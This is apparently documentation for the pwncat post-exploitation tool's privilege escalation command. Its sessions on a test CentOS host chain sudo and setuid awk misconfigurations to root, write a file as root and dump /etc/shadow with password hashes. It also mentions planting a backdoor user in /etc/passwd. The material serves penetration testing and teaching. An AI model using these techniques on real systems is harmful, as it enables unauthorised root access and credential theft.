Automated Privilege Escalation
==============================

.. toctree::
    :maxdepth: -1

``pwncat`` has the ability to attempt automated privilege escalation methods. A number of methods are implemented by
default such as:

* Set UID Binaries
* Sudo (with and without password)
* screen (CVE-2017-5618)
* DirtyCOW

Each of these methods utilize the capabilities of the GTFOBins module. The GTFOBins module provides a programmatic
interface to gtfobins_. Each privilege escalation module implements shell, file read or file write capabilities.
``pwncat`` will leverage these to get shell access as the specified user. ``pwncat`` does this by trying the following
methods with the provided capabilities:

* Executing a shell (the simplest option)
* Reading user private keys and ssh-ing to localhost
* Writing private keys
* Implanting a backdoor user in /etc/passwd (if file-write as root is available)

If ``pwncat`` does not find a method of gaining access as the specified user directly, it will attempt to escalate to
any other user it can recursively to attempt to find a path to the requested user.

Invoking Privilege Escalation
-----------------------------

The ``privesc`` command provides an interface to the underlying privilege escalation module. There are three different
modes available:

* Escalate (attempt to gain a shell)
* File Read (attempt to read a file as the specified user)
* File Write (attempt to write a file as the specified user)

The file read and file write capabilities will also attempt to recursively find a path to the requested user by utilizing
the escalate functionality in order to perform file read or write. Invoking the privesc module is simple:

.. code-block:: bash

    (local) pwncat$ privesc --help
    usage: privesc [-h] [--list] [--all] [--user USER] [--max-depth MAX_DEPTH] [--read]
                   [--write] [--path PATH] [--escalate] [--data DATA]

    Attempt various privilege escalation methods. This command will attempt search for
    privilege escalation across all known modules. Privilege escalation routes can grant
    file read, file write or shell capabilities. The "escalate" mode will attempt to abuse
    any of these to gain a shell. Further, escalation and file read/write actions will
    attempt to escalate multiple times to reach the target user if possible, attempting all
    known escalation paths until one arrives at the target user.

    optional arguments:
      -h, --help            show this help message and exit
      --list, -l            Enumerate and list available privesc techniques
      --all, -a             list escalations for all users
      --user USER, -u USER  the user to gain privileges as
      --max-depth MAX_DEPTH, -m MAX_DEPTH
                            Maximum depth for the privesc search (default: no maximum)
      --read, -r            Attempt to read a remote file as the specified user
      --write, -w           Attempt to write a remote file as the specified user
      --path PATH, -p PATH  Remote path for read or write actions
      --escalate, -e        Attempt to escalate to gain a full shell as the target user
      --data DATA, -d DATA  The local file to write to the remote file

If no user is specified, ``pwncat`` will assume you would like to escalate to root. The default action is to enumerate
and list all known privilege escalation methods.

Privilege Escalation Enumeration
--------------------------------

The ``--list/-l`` option is the default action for ``privesc`` and will list all known and observed privilege escalation
methods. This may take some time as it will need to probe the remote system for application version, SUID files, sudo
rights, etc. After it finishes, it will list all **direct** privilege escalation methods observed. It cannot list second
layer privilege escalation methods, only methods to gain access in one hop.

.. code-block:: bash

    (local) pwncat$ privesc -l
    [+] searching for setuid binaries: complete
    [+]  - file read as phil via /bin/cat (sudo NOPASSWD)

The results of some searches are cached in the database, which means that methods located as a different user may be
displayed for this user after enumeration. For example, after escalating to root, ``pwncat`` may know about SUID binaries
not initially observable as the ``bob`` user. After escalating and backing out to ``bob``, you can view ``privesc -l``
to see the new SUID binary. In this case, ``bob`` can't use ``/home/phil/awk``, however ``pwncat`` now knows it exists.

.. code-block:: bash

    (remote) bob@pwncat-centos-testing:/root$ id
    uid=1001(bob) gid=1001(bob) groups=1001(bob) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    (remote) bob@pwncat-centos-testing:/root$
    [+] local terminal restored
    (local) pwncat$ privesc -e
    [+] privilege escalation succeeded using:
     ⮡ file read as phil via /bin/cat (sudo NOPASSWD)
      ⮡ file write as george via /home/phil/awk (setuid)
       ⮡ shell as root via /bin/awk (sudo NOPASSWD)
    [+] pwncat is ready 🐈

    (remote) root@pwncat-centos-testing:/home/george# id
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    (remote) root@pwncat-centos-testing:/home/george# exit
    exit
    (remote) george@pwncat-centos-testing:~$ exit
    logout
    Connection to 127.0.0.1 closed.
    vGeCOehDTw
    (remote) phil@pwncat-centos-testing:~$ exit
    logout
    Connection to 127.0.0.1 closed.
    0MkSG6WtyD
    (remote) bob@pwncat-centos-testing:/root$ id
    uid=1001(bob) gid=1001(bob) groups=1001(bob) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    (remote) bob@pwncat-centos-testing:/root$
    [+] local terminal restored
    (local) pwncat$ privesc -l
    [+]  - file read as phil via /bin/cat (sudo NOPASSWD)
    [+]  - shell as george via /home/phil/awk (setuid)
    [+]  - file read as george via /home/phil/awk (setuid)
    [+]  - file read as george via /home/phil/awk (setuid)
    [+]  - file write as george via /home/phil/awk (setuid)

Gaining A Shell As Another User
-------------------------------

The ``escalate`` mode for the ``privesc`` command allows you to initiate automated privilege escalation to obtain a
shell as the specified user. As mentioned before, absent a specified user, ``pwncat`` will attempt to obtain ``root``
privileges. If ``pwncat`` is successful, it will tell the list of vulnerabilities leveraged to gain access as the user
at each step in the chain. In the example above, ``pwncat`` used vulnerabilities across three different users to gain
access as the root user. What is not visible above is the progress output displayed during enumeration. As ``pwncat``
enumerates privilege escalation methods, a line will be displayed detailing what methods ``pwncat`` is attempting or
enumerating. If there are any important failures or information, they will be kept in the output for your to inspect.
If not, this progress line will be overwritten with the successful chain as seen above.

Gaining File Write As Another User
----------------------------------

The ``privesc`` command provides access to the underlying File Write capability of the the various privilege escalation
modules. This is mainly for debugging purposes, but does allow you to write local file files from the attacking machine
to a remote file utilizing the privileges of the given user. As with ``escalate``, it will attempt to find a chain of
vulnerabilities to allow file-write as the specified user (``root`` by default). This mode is activated with the
``--write/-w`` switch. The remote path you would like to write to is specified with ``--path/-p``. The local file you
would like to write is specified with ``--data/-d``.

.. code-block:: bash

    (remote) george@pwncat-centos-testing:~$
    [+] local terminal restored
    (local) pwncat$ privesc -l
    [+] searching for setuid binaries: complete
    [+]  - shell as root via /bin/awk (sudo NOPASSWD)
    [+]  - file read as root via /bin/awk (sudo NOPASSWD)
    [+]  - file read as root via /bin/awk (sudo NOPASSWD)
    [+]  - file write as root via /bin/awk (sudo NOPASSWD)
    [+]  - shell as george via /home/phil/awk (setuid)
    [+]  - file read as george via /home/phil/awk (setuid)
    [+]  - file read as george via /home/phil/awk (setuid)
    [+]  - file write as george via /home/phil/awk (setuid)
    (local) pwncat$ privesc -u root -w -p /tmp/owned_by_root -d /tmp/hello
    [+] file written successfully!
    (local) pwncat$
    [+] pwncat is ready 🐈

    (remote) george@pwncat-centos-testing:~$ ls -la /tmp/owned_by_root
    -rw-r--r--. 1 root root 18 May 19 20:14 /tmp/owned_by_root
    (remote) george@pwncat-centos-testing:~$ cat /tmp/owned_by_root
    hello from george
    (remote) george@pwncat-centos-testing:~$

Gaining File Read As Another User
---------------------------------

Reading files is much like the File Write mode discussed above. Utilizing this mode is accomplished with the ``--read/-r``
switch. Again, the remote path is specified with the ``--path/-p`` parameter.

.. code-block:: bash

    (remote) george@pwncat-centos-testing:~$
    [+] local terminal restored
    (local) pwncat$ privesc -u root -r -p /etc/shadow
    [+] file successfully opened!
    root:$6$DwHIiXGAalKEUS9Z$rGSdeIjIfLoalLc9LnQfGzZZms/79Z6kEpzhBrJZRnXFtm/oPm0CsVaMdDCyVsqsXVp3AxIqfpSclD99wU27K.:18394:0:99999:7:::
    bin:*:18264:0:99999:7:::
    daemon:*:18264:0:99999:7:::
    adm:*:18264:0:99999:7:::
    lp:*:18264:0:99999:7:::
    sync:*:18264:0:99999:7:::
    shutdown:*:18264:0:99999:7:::
    halt:*:18264:0:99999:7:::
    mail:*:18264:0:99999:7:::
    operator:*:18264:0:99999:7:::
    games:*:18264:0:99999:7:::
    ftp:*:18264:0:99999:7:::
    nobody:*:18264:0:99999:7:::
    dbus:!!:18274::::::
    systemd-coredump:!!:18274::::::
    systemd-resolve:!!:18274::::::
    tss:!!:18274::::::
    polkitd:!!:18274::::::
    rpc:!!:18274:0:99999:7:::
    unbound:!!:18274::::::
    sssd:!!:18274::::::
    setroubleshoot:!!:18274::::::
    rpcuser:!!:18274::::::
    cockpit-ws:!!:18274::::::
    sshd:!!:18274::::::
    chrony:!!:18274::::::
    centos:!!:18394:0:99999:7:::
    bob:$6$U6YRRC9vclExaoie$9nmmBXWekwwwN3qWRBusxH4lyfvcE1FoYPbrBo2krXXcg1s1wZBYot/67XsYmdf0RPK3vkt3s2nib0Pc5Su8h.:18397:0:99999:7:::
    george:$6$aDFGsMbwH6bPSNaT$T3V0OFpJU1rnYyTfCrj.Oea2srqjkxB8M9xkik8n1mn/xBsXrUaV5BRLwwTcPUbELNx0Rz3eqTIkTL/G2cYse0:18397:0:99999:7:::
    phil:$6$8ZHcNNpUYrDgTCsn$DrY.Nxa4E7JM.g91TBm4AOMxoOdGLCpgVqADCvaAv8NQlvgAyvbIDaPbFaoIj.B6wZhP.ZlVBcsCUq8GuhQgY1:18397:0:99999:7:::
    (local) pwncat$

.. _gtfobins: https://gtfobins.github.io